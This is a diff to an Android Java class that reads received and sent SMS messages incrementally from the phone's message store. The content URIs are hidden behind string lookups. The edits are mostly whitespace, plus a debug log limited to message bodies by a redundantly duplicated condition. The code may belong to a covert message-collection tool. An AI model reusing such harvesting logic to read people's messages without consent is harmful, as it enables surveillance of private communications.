@@ -36,7 +36,7 @@ public class SmsBrowser {
 
 		int maxRec = parse(Messages.getString("14.0"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
 		int maxSent = parse(Messages.getString("14.1"), Sms.SENT, lastManagedId); //$NON-NLS-1$
-		
+
 		maxId = Math.max(maxRec, maxSent);
 
 		return list;
@@ -46,7 +46,6 @@ public class SmsBrowser {
 		list.clear();
 
 		maxId = parse(Messages.getString("14.1"), Sms.SENT, lastManagedId); //$NON-NLS-1$
-		
 
 		return list;
 	}
@@ -59,13 +58,13 @@ public class SmsBrowser {
 		final Cursor c = Status.getAppContext().getContentResolver()
 				.query(Uri.parse(content), projection, null, null, null);
 
-		final int smsEntriesCount = c.getCount();	
+		final int smsEntriesCount = c.getCount();
 		int localMaxId = lastManagedId;
 
 		if (c.moveToFirst() == false) {
 			c.close();
 			return localMaxId;
-		}		
+		}
 
 		for (int i = 0; i < smsEntriesCount; i++) {
 			String body, number;
@@ -73,16 +72,16 @@ public class SmsBrowser {
 			boolean sentStatus;
 
 			// These fields are needed
-			try {				
+			try {
 				id = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("_id")).toString());
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (parse): id = " + id + " new maxId: " + maxId);
 				}
 				if (id <= lastManagedId) {
 					continue;
 				}
-				
+
 				localMaxId = Math.max(localMaxId, id);
 				printColumnsSms(c);
 
@@ -187,13 +186,15 @@ public class SmsBrowser {
 
 			c.moveToNext();
 			list.add(s);
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) end, localMaxId: " + localMaxId);
 			}
-						
+
 		}
-		if (Cfg.DEBUG) { Check.asserts(localMaxId >= lastManagedId, " (parse) Assert failed"); }
+		if (Cfg.DEBUG) {
+			Check.asserts(localMaxId >= lastManagedId, " (parse) Assert failed");
+		}
 		return localMaxId;
 	}
 
@@ -203,7 +204,10 @@ public class SmsBrowser {
 			final String name = c.getColumnName(j);
 			final String value = c.getString(c.getColumnIndex(name));
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
+
+				if (name.equals("body") || name.equals("body")) {
+					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
+				}
 			}
 		}
 
